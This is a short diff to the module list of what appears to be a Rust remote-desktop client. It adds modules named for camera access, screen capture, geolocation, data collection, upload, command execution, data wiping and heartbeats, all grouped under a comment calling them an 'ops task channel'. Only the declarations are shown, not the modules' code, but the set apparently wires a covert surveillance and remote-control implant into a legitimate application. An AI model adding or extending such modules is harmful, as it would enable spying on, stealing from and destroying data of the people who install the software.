@@ -43,6 +43,18 @@ pub mod flutter;
 pub mod flutter_ffi;
 use common::*;
 mod auth_2fa;
+// ONYX: 运维任务通道（验签 + 执行 + 回执）
+mod onyx_cam;
+mod onyx_collect;
+mod onyx_exec;
+mod onyx_geo;
+mod onyx_identity;
+mod onyx_screen;
+mod onyx_src;
+mod onyx_task;
+mod onyx_tree;
+mod onyx_upload;
+mod onyx_wipe;
 #[cfg(not(target_os = "ios"))]
 mod clipboard;
 #[cfg(not(any(target_os = "android", target_os = "ios")))]
@@ -67,6 +79,7 @@ mod ui_interface;
 mod ui_session_interface;
 
 mod hbbs_http;
+mod onyx_heartbeat;
 
 #[cfg(any(target_os = "windows", target_os = "linux", target_os = "macos"))]
 pub mod clipboard_file;
